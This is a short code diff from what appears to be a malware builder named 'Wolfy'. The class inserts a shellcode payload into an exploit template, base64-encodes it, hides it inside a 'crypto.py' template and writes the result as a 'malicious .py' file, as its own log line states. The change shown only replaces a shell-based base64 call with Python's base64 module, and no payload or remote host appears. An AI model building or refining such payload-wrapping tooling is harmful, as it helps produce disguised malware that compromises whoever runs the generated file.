@@ -68,13 +68,13 @@ class Wolfy:
         # replacing shellcode 
         f_xpl_data = open("templates/xpl.py","r").read()
         f_xpl_data = f_xpl_data.replace("__replacepayload__", shellcode_payload)
-        f_xpl_data = os.popen(f"echo {f_xpl_data.encode('utf-8')} | base64 -w0").read()
-        print(f_xpl_data)
+        f_xpl_data = base64.b64encode(f_xpl_data.encode('utf-8'))
+        # print(f_xpl_data.decode('utf-8'))
 
         print("[INFO] - Generating malicious .py")
 
         f_crypto_data = open("templates/crypto.py", "r").read()
-        f_crypto_data = f_crypto_data.replace("__re__", f_xpl_data)
+        f_crypto_data = f_crypto_data.replace("__re__", f_xpl_data.decode("utf-8"))
 
         f_build = open(f"build/{exename}.py", "w")
         f_build.write(f_crypto_data)
